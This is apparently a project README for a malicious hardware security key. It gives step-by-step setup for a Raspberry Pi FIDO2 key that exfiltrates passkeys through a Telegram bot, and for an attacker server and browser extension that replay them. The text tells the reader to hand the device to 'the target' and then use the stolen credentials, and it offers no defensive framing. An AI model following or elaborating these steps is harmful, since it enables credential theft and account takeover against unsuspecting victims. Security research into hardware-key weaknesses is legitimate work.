# Passkey exfiltration from malformed Security keys

## This is based on Open Source security key project https://github.com/AdityaMitra5102/RPi-FIDO2-Security-Key


## Development of Security Key:

1. Set up the Raspberry Pi 5 based on instructions from the parent repository. DO NOT CLONE THAT REPO AND RUN THE SCRIPT
2. Set up your telegram bot and get chat ID for exfiltration. (Check telegram documentation for how to)
3. Clone this repository (or just the security key folder)
4. Edit the security_key.py file, go to the `exfiltrate()` function and add your bot token and chat id
5. Run the `installer.sh` script as `sudo`
6. The security key is ready to be given to the target.

## Setting up the attacker server

1. Clone this repository or atelast the EVIL-Attacker folder
2. Install python, and the dependencies `python -m pip install requirements.txt`
3. Open a web browser, go to extensions, load unpacked, then select the extension folder here.
4. To use this in incongito tabs, allow the extension to run in incognito tabs.
5. Wait till you receive exfiltrated data from the telegram bot
6. When you get the data, copy it.
7. Run `EVIL_Server.py`. Enter the exfiltrated data when prompted.
8. It will show which data has been exfiltrated for which user and which RP
9. Now you can use these credentials.


https://youtu.be/_Mvo-4kkleg
